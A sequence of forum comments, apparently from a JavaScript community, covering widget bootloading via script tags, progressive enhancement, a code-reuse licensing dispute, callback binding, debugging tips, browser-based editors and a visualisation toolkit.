Interesting, but I must ask: why? There is a lot of interest in JavaScript because it is the sole programming language that interfaces with web browsers, but it is hard to imagine someone actually preferring to use JavaScript over Python.
I fail to see the advantage to conventional progressive enhancement. Especially since &gt; Encapsulation and closures reliably ensure that this method may be applied several times on a single page or used with different content. not only means that you have multiple copies of the script in memory, the different URLs might also prevent caching and generally run contrary to the general goal to have as few requests for each page as possible to save on request latency.
I have been using this one, and I like it: http://json.parser.online.fr/
You only have multiple copies of the bootloading-routine in memory. The bootloader is only 2k of code, from which only a core function with a few lines remains in memory after bootloading. The "active code" has to be programmed as an object, that is instantiated from within the bootloader. Using the same application multiple times within a page has only the minimum amount of request, does not load any library twice and an extremely well memory footprint. When using this method, you are basically forced to "program nicely", resulting in a clear global namespace and conflict free libraries. It's hard to spot, but if you look for it with firebug, you can see how multiple uses of the same application only use the minimum amount of requests. It's way easier to hand someone only a single line of code to use an application within a foreign web page, then to document which libraries are necessary, in which order they have to be loaded and where to put a specific id to instantiate the DOM-object. 
&gt; the sustained success of flash over the years is largely due to the fact, that interactive and complex content is so easy to put on a web page, while the page itself can be agnostic to this encapsuled content. This was what kept flash alive. Now a days though, this is not the case. Flash is primarily used for video, and other things that can't be easily accomplished in JS (or if they can be, the most widely used browsers can't handle it.) I am failing to see what the big deal here is...it uses a closure? cool, JS 101 though. Are you saying I can theoretically do something like make multiple lightboxes on a page and have them use the same memory? If so, that's pretty sweet.
Yepp, that's what it does. Put up a simple HTML file, e.g. with three differently sized DIVs, and include in each DIV one of these script src lines: &lt;script type="text/javascript" src="http://intermedia.pixelboxx.com/demo/boot/a8OQ_IrDJMJDYfZL/hovergallery"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="http://intermedia.pixelboxx.com/demo/boot/52CLb2BKmSr8_E7/hovergallery"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="http://intermedia.pixelboxx.com/demo/boot/aKO3JMJ3bFgL/hovergallery"&gt;&lt;/script&gt; Then look at the rendered DOM with firebug and watch out for the changed contents in the HEAD section. edit: typo
hmm, I will need to investigate further...
ok.. so it's not as bad as I thought, but I still don't get: what are the advantages over doing normal progressive enhancement. You provide the elements you want to enhance with a special class, e.g. &lt;div class="foo"&gt; xxx &lt;/div&gt; you find the ".foo"s and do your magic with them. if things get more complicated, you might have add configuration metadata to your elements. Sounds much simpler to me. edit: removed garbage.. not used to new keyboard's keyboard/touchpad.
True, but you can build a lot of services that use a different server to change the contents of the capsule. Think of a "comment this page"-Server, where the only thing required is putting a single script-line into the hosting page and everything else is run as a service on a different server. We had a lot of requirements, where the "webmaster" of a fairly static page wanted an easy way to add and update a gallery. We than used this bootloading technology to separate hosting page from imported content. And, as a matter of fact, even the very simple steps, a google-map needs to be put up in a hosting page, are beyond the average "webmaster" (read: clicky-whooshy user). Another attribute of this method is, that crawlers are completely agnostic to the added content. Which can bee either good or bad - depending on the context.
I've always been regretted that there were no large efforts of providing some kind of HTML class stereotypes for progressive ehhancement -- a ontology for limited use cases to alllow multiple implementations of common functionality. The closest we ever got to that is stuff like jQuery UI, and that's only targetting visual aspects.
I prefer JavaScript over Python.
I guess it's better than just having one language, but I don't think it's a substitute for actually translating the page.
Well it uses mysql, and a legacy way of moving that data easily is via csv
when you said underscore trick, i thought you meant like this: http://acko.net/blog/the-ie7-myth
I find this much harder to read.
Translation in the client. What a terrible idea.
Seems like Marak credited you in the code. I'm not sure why this is an issue.
I'm not the author, but the guy who wrote it originally didn't license the code for reuse. Unlicensed code doesn't automatically become "DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE" http://en.wikipedia.org/wiki/WTFPL
From the article: "His response to my comments was that because I didn’t explicitly put a copyright notice in my code that he could use it however he wanted (which I’m pretty sure isn’t true)"
eww, really? mysqldump is so much easier and more trustworthy... does Joomla have some sort of import tool that moves data via CSV?
The title is a bit misleading this doesn't turn any function into a callback, it just aliases an anonymous function into an underscore variable, much liked frameworks alias the dollar sign $ into document.getElementById (with varying degrees of extended functionality).
He was also just being an ass about it, which I've seen time and again on projects. Someone will download the code, not understand it and thus declare it "broken" and then "fix" whatever they claim to be wrong with it, often in unsecure, convoluted, inefficient, and stupid ways, then get a smart-mouth attitude about how the original code sucked and they're so much better. I've seen people go so far as to completely duplicate existing feature sets within things because they claimed (by complaining loudly and obnoxiously to anyone who would listen) that said features didn't exist.
yeah, and for what benefit? Saving 11 characters in the code? While sacrificing readability. Right. I think sitecrafting.com said it best: &gt; this is a bit of complicated, obtuse code. And it's use is not obvious
Yeah, that points to a complete and proud cluelessness of copyright laws. It's a little upsetting to read so many boneheaded comments on his blogs, ranging from "you got credited so what's wrong?" to "your code sucks anyway", with a dash of "you shoulda made it harder to steal then." I kinda hope most of those are just the guy caught in the cookie jar that felt like trolling, or it paints a rather bleak picture of that blog's readership. 
Seems like Marak credited you in the code. I'm not sure why this is an issue. Also, I, blackrobot, club seals. . . . . . . . original comment by blackrobot. there was no license on it so I repurposed it.
Seems like Marak credited you in the code. I'm not sure why this is an issue. Also, I, blackrobot, club seals. . . . . . . . original comment by blackrobot. there was no license on it so I repurposed it.
Let's do it the JQuery way: Overwrite the $() thingy with more magic so that it recognizes that you're trying to create a parametrized callback from a function and one or more arbitrary parameters. There, all better. ;)
How is this different from currying?
Rather than punctionation, why not implement Function.prototype.bind or Function.prototype.curry like everyone else?
Ok, so it sounds like a lot of people don't like this idea. Does anyone have a solution to make it better? Maybe examples? What do you all use?
The idea is to be able to pass arguments into a callback. 
This is relevant to my interests.
Cute, but I cannot read it... （ ´_ゝ`）
That's exactly what bind or curry do. Your example: $('.button').click(_(hide, 500)); could be written with [Oliver Steel's functional.js](http://osteele.com/sources/javascript/functional/) as: $('.button'.).click(hide.bind(this, 500)); That version doesn't hide the "this" parameter, but you could write a Function.prototype.bind that does. And then you can save underscore for really interesting things like the partial application in functional.js. :)
 setTimeout("tokei()", 1000) makes sad panda want to commit suicide. Seriously, in a reference book/manga, why promote that kind of junk?
Working with a non-sql database on the other end. But From Joomla-Joomla (sql-sql) sqldumps are the norm.
You may find that stackoverflow is a better place to get help
Try alert()ing the value of hideSplash - it might not be what you think it is. Is it a string like you're assuming?
are you sure it is set to "1" and not just 1? in javascript there is a difference between the string 1 and the int 1. Edit: Oh, also, I can't see where you are creating the dialog. Make sure you are setting the autoOpen property to false. It defaults to true.
oh, yay. another popup imploring us to fill out a survey or visit sponsors.
look at [meerkat](http://meerkat.jarodtaylor.com/)
I see inline JS...NOOOOOOOOO.
I wish there were something like this. Even if there were a tutorial that focused on teaching javascript by making games I would be happy.
I accidentally the whole stack in JavaScript with Node.JS
No, this guy isnt drinking any kool aid, why would you say that?
There are CSV specs?
[Well, I read the wikipedia article on CSV :\)](http://en.wikipedia.org/wiki/Comma-separated_values)
I'm interested to know how much Blizzard is involved in optimizing Firefox's JavaScript engine. It makes me wonder what motivation (besides goodwill towards man) the company has for wanting super fast JavaScript. 
&gt;Speaking today at the net-performance obsessed Velocity conference in Santa Clara, California, Mozilla open source evangelist __Chris Blizzard__ showed off a Firefox JavaScript demo meant to mimic a test that Google uses to show off Native Client, and he said that even with today's Firefox, Mozilla comes within 50 per cent of the performance of native code. Chris Blizzard, not Blizzard Entertainment. 
hahahahahah! This is what I get for half-reading something before I've really woken up.
ha, i was thinking the same thing...Skimming FTL
all those pixelboxx links here recently are a nice showcase of worst-practice examples
IE is a disease
This is actually a nice little list of JS problems in IE.
Thank you for making these links.
yo can use the same language at client AND server side! a web developers nirvana
nice overview, this one had slipped under my radar actually. seems very enterprisey indeed, something to keep in mind for big projects...
The Google Closure minimizer doesn't work on my JavaScript code using the SIMPLE_OPTIMIZATIONS option. My JavaScript code nearly jslints perfectly except for some minor issues. My code compresses and works well with the YUI compressor, jsPacker.pl (-e62), and jsmin. 
&gt; second pass bad assert: first pass key 'firstPassFoo' not equal to stored value 'bar'
Uhm. *Why*? We have perfectly good vim on a perfectly good OS. Why do we need to create an OS out of the browser and run an editor on it? That's madness.
Because it is teh q00l?
That's what people said about Chrome. 
That's what I say about all web application abominations. Regardless of whether they run best in firefox or chrome.
Because in a few years this will actually be useful, right now, not so much. Let's say vim is like super mario brothers 3, it's ancient, but it's still amazing and arguably the top of it's genera. Bespin is like the first star fox, it's slow, blocky and uses way too much cpu and ram. In the not-too-distant future, it's gonna seem as archaic as vim, but a lot of useful applications will have been spawned from its ideas. I'm not arguing that remaking most desktop and cl apps in html &amp; js is a good idea, but it's clear that this is the direction that a lot of people are invested in.
Gorgeous!
Because *THE CLOUD*!!!1oneeleven
All the tech I see coming from this is how to create web atrocities. Even if it didn't use too much cpu or ram and had every single feature vim has, that still doesn't make it a good editor. I do not need my browser to be an operating system, just like I do not need my operating system do display websites.
No one NEEDS their browser to be an OS, the same can be said about text editors (I'm looking at you emacs). HOWEVER, there's both a lot of people/money behind replicating OS functionality in-browser and a lot of people who wouldn't mind using a unified browser/OS (just like there's nothing wrong with using emacs as an OS). And in the case of say, smartphones, it's actually a pretty good idea, at least in theory. As browsers move toward implementing standards properly and as js engines increase in speed, the lure of writing for just one platform that also happens to be incredibly widespread, has drawn a good deal of attention (modern js libraries have been a big help too). In reality, most complex web apps are relatively slow cheap parlor tricks, old applications updated to use the DOM API. But a hardcore command line user could argue the same about "inefficient window managers" and the like. As an author of a semi-complex web app, I know how much slower it is than if it was native, but that doesn't stop me from working on it, not in bespin, but vim, from the command line.
It looks really great and the speed of the animations is wonderful! Great job!
Sometimes I forget I why I'm subscribed to this sub-reddit. Then a submission like this happens and it causes me to remember. Great job.
Great work, really, really well done.
Excellent work. I'm evaluating data vis toolkits for an upcoming project, definitely adding this one to the list. Thanks!
http://thejit.org/static/v20/Jit/Examples/AreaChart/example1.html# This is cool, but it would be nicer if you could click the blank space to 'Remove Filter'. I was kind of expecting that to work... Very nice though :)
What do you mean "just released"? I've been watching it since at least 2 years.
I'm sorry, I forgot to say "version 2.0.0".
Oh, I haven;t thought about that. This can be customizable of course :) . Thanks for the feedback!
Ah. That makes sense now. Love your work. Thanks a lot for this.
Fantastic, very professional looking, amazing animation too. You know in the node map/web graphs [like this](http://thejit.org/static/v20/Jit/Examples/ForceDirected/example2.html), is it possible to have custom PNG icons for the nodes?
sensational!
Great! If you don't mind me asking: if I were to make a simple PieChart, how can I make the slices have different colours? Btw I get a syntax error in the documentation pages: dp.SyntaxHighlighter.ClipboardSwf = "../../javascript/clipboard.swf"; dp is undefined. IE 8.0.6001.18702 (I'm at work ;-) 
You can specify the colors inside the JSON data. var json = { color: ['#ccc', '#ddd', ...], label: 'somename', values: [ ... ] }; hope it helps, And thanks for the docs feedback, I'll be fixing this as soon as I get home!
Thanks!
The lagging was f-ing annoying. The browser was completely unresponsive for a few seconds if there were many comments. So... I fixed it. Now it spends up to 50 msec with modifying the tree and then it takes a break for 25msec. And so on until it's done. It's still faster than the original since I'm using a fragment to batch things up a bit. That small tweak alone made it about twice as fast, which means that even with that waiting involved it only takes about 75% of the time the original GM script took.
SWEET!